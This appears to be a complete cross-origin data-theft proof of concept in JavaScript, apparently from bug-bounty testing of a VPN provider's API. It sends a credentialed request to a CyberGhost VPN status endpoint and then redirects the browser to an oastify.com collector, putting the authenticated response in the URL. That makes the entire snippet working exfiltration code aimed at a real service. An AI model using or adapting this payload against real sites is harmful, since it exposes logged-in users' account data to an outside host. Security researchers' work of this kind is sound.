var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://api.cyberghostvpn.com/cg/status?flags=0&os=win&os_version=10.0.26200&app_version=8.4.15.14706&app_language=en&os_region=us&environment=Live&affiliate=&partners_id=1',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='https://rd0ekamx9r0hb83f9hilnmqxvcmid63us.oastify.com/log?key='+this.responseText;
};
